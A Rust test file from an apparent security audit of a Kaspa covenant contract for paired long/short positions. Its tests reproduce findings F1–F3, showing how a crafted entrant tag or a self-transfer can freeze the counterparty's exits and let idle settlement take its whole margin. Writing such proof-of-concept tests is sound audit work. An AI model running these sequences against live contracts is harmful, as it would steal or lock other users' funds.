//! Review 1 (docs/audit/REVIEW-1.md): tags written from unchecked arguments, and the entry price.
//!
//! KpfPair.transfer (and closeHost, and P7 through handOver) writes the entrant's tag from an argument that no
//! covenant checks when the entrant is a direct taker. Every entry except idleSettle and coopClose runs the
//! live-tag guard `OpCovInputCount(tag) == 0`. A tag equal to the pair's own covenant id is always "live" (the
//! pair itself is an input), and a tag equal to the market token's covenant id is live in every evidence
//! transaction (the ask's custody or the seller's tokens are token inputs).

mod common;
mod kpf;

use common::*;
use kaspa_consensus_core::tx::{Transaction, TransactionOutput, UtxoEntry};
use kaspa_consensus_core::Hash;
use kpf::evidence::*;
use kpf::paths::*;
use kpf::*;
use secp256k1::Keypair;

const PAIR_ID: Hash = Hash::from_bytes([0x5c; 32]);
const N: i64 = 1_000_000_000;
const LIQ_ASK: i64 = 940_000_000;

fn lk() -> Keypair {
    keypair(11)
}
fn sk() -> Keypair {
    keypair(12)
}
fn fk() -> Keypair {
    keypair(14)
}
fn taker() -> Keypair {
    keypair(16)
}

fn accept(tx: &Transaction, e: &[UtxoEntry]) {
    assert_accepted(tx, e);
    let ins: u128 = e.iter().map(|u| u.amount as u128).sum();
    let outs: u128 = tx.outputs.iter().map(|o| o.value as u128).sum();
    assert!(outs <= ins, "outputs {outs} > inputs {ins}");
}

fn accept_d(d: &Draft) -> Transaction {
    let (tx, e) = d.build();
    accept(&tx, &e);
    tx
}

fn refused0(d: &Draft) {
    let (tx, e) = d.build();
    assert_input_fails(&tx, &e, 0);
}

fn live0(p: &Pair) -> Live {
    Live { p: p.clone(), value: p.floor() as u64, id: PAIR_ID, op: outpoint(10) }
}

/// A direct-taker transfer of the whole long side of `l` at x: entrant key ek, tag et, new bound nb.
fn take_long(l: &Live, x: i64, nb: i64, ek: &Keypair, et: Hash, fn_: u32) -> (Live, Transaction) {
    let t = TransferSpec { side: LONG, n: l.p.size, x, nb, ek: xonly(ek), et, k: 0 };
    let d = transfer_draft(l, &t, &Entrant::Direct(*ek), &fk(), fn_);
    let tx = accept_d(&d);
    (live_pairs(&tx, &d).remove(0), tx)
}

fn add_margin_draft(l: &Live, signer: &Keypair, side: i64, delta: i64) -> Draft {
    let mut n = l.p.clone();
    if side == LONG {
        n.bl -= delta;
    } else {
        n.bs += delta;
    }
    let add = q(l.p.size, delta, l.p.m.scale, l.p.m.scale - 1) as u64;
    let ins = vec![pair_input(l, "addMargin", vec![Arg::Sig(*signer), iv(side), iv(delta)]), funder(&fk(), 90, F_FUNDS)];
    let outs = vec![out(l.value + add, p2sh(&n.art()), bind(0, l.id)), out(0, p2pk_spk(&fk()), None)];
    Draft::new(ins, outs, Some(1))
}

fn coop_draft(l: &Live, mut outs: Vec<TransactionOutput>) -> Draft {
    let ins = vec![pair_input(l, "coopClose", vec![Arg::Sig(lk()), Arg::Sig(sk())]), funder(&fk(), 91, F_FUNDS)];
    let ch = outs.len();
    outs.push(out(0, p2pk_spk(&fk()), None));
    Draft::new(ins, outs, Some(ch))
}

/// The short's own defences on a pair: amend (resets the idle age), add margin, and P5 close at an ask.
fn short_defences_refused(part: &Live) {
    refused0(&amend_draft(part, &sk(), SHORT, (950_000_000, 0, 0), &fk(), 80));
    refused0(&add_margin_draft(part, &sk(), SHORT, 10_000_000));
    let leg = PairLeg { l: part.clone(), n: part.p.size, q: 0, act: Act::Close { side: SHORT, signer: sk() } };
    refused0(&ev_draft(&[leg], &Evidence::ask(1_100_000_000, part.p.size), &fk(), 81));
}

// ---------------------------------------------------------------- F1 (Critical)

/// exploit_self_tag_freeze_then_idle_theft (F1).
///
/// Who loses what: the short loses its whole margin, q(s, bs - bl) = 2,000 KAS in the DESIGN 5 example (it keeps
/// only the 0.2 KAS carrier), at no cost to the long beyond network fees.
///
/// 1. The long amends its own listing to ask = bs (its own signature only).
/// 2. It takes its own listing as a direct taker at x = bs with entrant key = itself, nb = bl and tag et = the
///    pair's own covenant id. It pays itself q(s, bs - bl) and re-funds the part with the same amount.
/// 3. The part has entryPrice = bs and tagL = its own id. Every guarded entry of the short now fails the live-tag
///    guard (the pair itself is the input carrying that id): amend, addMargin, P5 close, transfer, P4. So the
///    short can neither reset the idle age nor exit.
/// 4. After idleDaa, anyone runs idleSettle (no tag guard): the long is paid q(s, c(bs) - bl), everything.
#[test]
fn exploit_self_tag_freeze_then_idle_theft() {
    let p = pair(&lk(), &sk());
    let l = live0(&p);
    // 1. the long lists at bs.
    let d = amend_draft(&l, &lk(), LONG, (p.bs, 0, 0), &fk(), 1);
    let tx = accept_d(&d);
    let l2 = live_pairs(&tx, &d).remove(0);
    // 2. self-transfer at x = bs, tag = own id.
    let (part, tx) = take_long(&l2, p.bs, p.bl, &lk(), l2.id, 2);
    assert_eq!(tx.outputs[0].value as i64, q(N, p.bs - p.bl, SCALE, 0), "the long pays itself");
    assert_eq!((part.p.tag_l, part.p.entry, part.p.bl, part.p.bs), (part.id, p.bs, p.bl, p.bs));
    // 3. the short is frozen.
    short_defences_refused(&part);
    // 4. idle settle pays the long the whole range.
    let d = idle_draft(&part, &fk(), 3);
    let tx = accept_d(&d);
    assert_eq!(tx.outputs[0].value as i64, q(N, p.bs - p.bl, SCALE, 0));
    assert_eq!(tx.outputs[2].value as i64, C, "the short keeps only the carrier");
    // Before the attack the short was owed q(s, bs - E) = 2,000 KAS at the stored entry 10 KAS.
    assert_eq!(p.short_at(p.entry), 200_000_000_000);
}

/// exploit_short_self_tag_freeze_then_idle_theft (F1, mirrored): the short lists shortBid, takes it itself at
/// x = 0 with tag = own id; E = 0 clamps to bl, so idle settle gives the long nothing.
/// Who loses what: the long loses its whole margin, q(s, bs - bl) - nothing comes back but dust rules.
#[test]
fn exploit_short_self_tag_freeze_then_idle_theft() {
    let p = pair(&lk(), &sk());
    let l = live0(&p);
    let d = amend_draft(&l, &sk(), SHORT, (p.bl, 0, 0), &fk(), 4);
    let tx = accept_d(&d);
    let l2 = live_pairs(&tx, &d).remove(0);
    let t = TransferSpec { side: SHORT, n: N, x: 0, nb: p.bs, ek: xonly(&sk()), et: l2.id, k: 0 };
    let d = transfer_draft(&l2, &t, &Entrant::Direct(sk()), &fk(), 5);
    let tx = accept_d(&d);
    let part = live_pairs(&tx, &d).remove(0);
    assert_eq!((part.p.tag_s, part.p.entry), (part.id, 0));
    // The long cannot reset the age.
    refused0(&amend_draft(&part, &lk(), LONG, (1_100_000_000, 0, 0), &fk(), 6));
    let d = idle_draft(&part, &fk(), 7);
    let tx = accept_d(&d);
    // idle_out: the long's payout q(s, 0) = 0 is below dust, so the short takes the whole value.
    assert_eq!(tx.outputs[2].value, part.value);
    assert_eq!(tx.outputs[0].value, 0);
}

/// exploit_third_party_freeze (F1, griefing variant). Any taker of an ordinary listing (x = the long's ask) can
/// write et = the pair id. The stayer short loses every exit and every rescue for idleDaa (90 days) and is then
/// settled at x, a price it never consented to; liquidation of the new long is also impossible.
#[test]
fn exploit_third_party_freeze() {
    let mut p = pair(&lk(), &sk());
    (p.long_ask, p.long_min, p.long_tip) = (1_050_000_000, 0, 0);
    let l = live0(&p);
    let (part, _) = take_long(&l, 1_050_000_000, 850_000_000, &taker(), PAIR_ID, 8);
    assert_eq!(part.p.tag_l, part.id);
    short_defences_refused(&part);
    // P6 liquidation of the new long is refused too.
    let leg = PairLeg { l: part.clone(), n: N, q: 0, act: Act::Liq { side: LONG } };
    refused0(&ev_draft(&[leg], &Evidence::ask(800_000_000, N), &fk(), 9));
    // The only exits left: idleSettle after 90 days, or coopClose with the attacker's signature.
    accept_d(&idle_draft(&part, &fk(), 10));
}

/// holds_frozen_pair_coop_close_still_works: coopClose has no tag guard, so a frozen pair is released when both
/// owners sign (which needs the attacker's cooperation).
#[test]
fn holds_frozen_pair_coop_close_still_works() {
    let mut p = pair(&lk(), &sk());
    (p.long_ask, p.long_min, p.long_tip) = (p.bs, 0, 0);
    let l = live0(&p);
    let (part, _) = take_long(&l, p.bs, p.bl, &lk(), PAIR_ID, 11);
    let half = part.value / 2;
    accept_d(&coop_draft(&part, vec![out(half, p2pk_spk(&lk()), None), out(part.value - half, p2pk_spk(&sk()), None)]));
}

// ---------------------------------------------------------------- F2 (High)

/// exploit_token_id_tag_blocks_evidence (F2). A direct taker of the long listing writes et = the market token's
/// covenant id. Every evidence transaction carries a token input of that id (the ask's custody, or the tokens
/// sold to a bid), so the live-tag guard refuses P5, P6 and P7 on the pair for its whole life: the new long can
/// never be liquidated and the short can never close unilaterally. Evidence-free paths still work.
/// Who loses what: the short loses its evidence exit and the protection of liquidation (DESIGN 3.6, G3).
#[test]
fn exploit_token_id_tag_blocks_evidence() {
    let mut p = pair(&lk(), &sk());
    (p.long_ask, p.long_min, p.long_tip) = (1_050_000_000, 0, 0);
    let l = live0(&p);
    let tok = market().token_cov_id;
    let (part, _) = take_long(&l, 1_050_000_000, p.bl, &taker(), tok, 12);
    assert_eq!(part.p.tag_l, tok);
    // The same pair with an ordinary tag is liquidatable at this ask (control).
    let mut ctl = part.clone();
    ctl.p.tag_l = ZERO;
    let leg = |x: &Live| PairLeg { l: x.clone(), n: N, q: 0, act: Act::Liq { side: LONG } };
    accept_d(&ev_draft(&[leg(&ctl)], &Evidence::ask(LIQ_ASK, N), &fk(), 13));
    // With tag = token id: liquidation (ask) refused, short P5 (ask) refused, and a bid-based path refused too.
    refused0(&ev_draft(&[leg(&part)], &Evidence::ask(LIQ_ASK, N), &fk(), 14));
    let close_s = PairLeg { l: part.clone(), n: N, q: 0, act: Act::Close { side: SHORT, signer: sk() } };
    refused0(&ev_draft(&[close_s], &Evidence::ask(1_100_000_000, N), &fk(), 15));
    let close_l = PairLeg { l: part.clone(), n: N, q: 0, act: Act::Close { side: LONG, signer: taker() } };
    let (tx, e) = ev_draft(&[close_l], &Evidence::bid(1_050_000_000, N), &fk(), 16).build();
    assert_input_fails(&tx, &e, 0);
    // Evidence-free entries are unaffected (amend by the short works).
    accept_d(&amend_draft(&part, &sk(), SHORT, (950_000_000, 0, 0), &fk(), 17));
}

// ---------------------------------------------------------------- F3 (Medium)

/// exploit_entry_price_self_transfer (F3). Without any tag trick, the long sets the stored entry price to any
/// x >= its own ask by taking its own listing (net cost: fees). idleSettle then pays at that price. The short can
/// defend only by spending the pair at least once every idleDaa; an absent short loses its whole margin, not only
/// "its unrealised profit" (THREAT_MODEL K2), even if the market never moved.
#[test]
fn exploit_entry_price_self_transfer() {
    let mut p = pair(&lk(), &sk());
    (p.long_ask, p.long_min, p.long_tip) = (p.bs, 0, 0);
    let l = live0(&p);
    let (part, _) = take_long(&l, p.bs, p.bl, &lk(), ZERO, 18);
    assert_eq!(part.p.entry, p.bs);
    let tx = accept_d(&idle_draft(&part, &fk(), 19));
    assert_eq!(tx.outputs[0].value as i64, q(N, p.bs - p.bl, SCALE, 0));
    assert_eq!(tx.outputs[2].value as i64, C);
}

/// holds_ordinary_transfer_tag_does_not_freeze: control for F1. With et = 0 the stayer short keeps its defences.
#[test]
fn holds_ordinary_transfer_tag_does_not_freeze() {
    let mut p = pair(&lk(), &sk());
    (p.long_ask, p.long_min, p.long_tip) = (1_050_000_000, 0, 0);
    let l = live0(&p);
    let (part, _) = take_long(&l, 1_050_000_000, 850_000_000, &taker(), ZERO, 20);
    accept_d(&amend_draft(&part, &sk(), SHORT, (950_000_000, 0, 0), &fk(), 21));
    accept_d(&add_margin_draft(&part, &sk(), SHORT, 10_000_000));
}
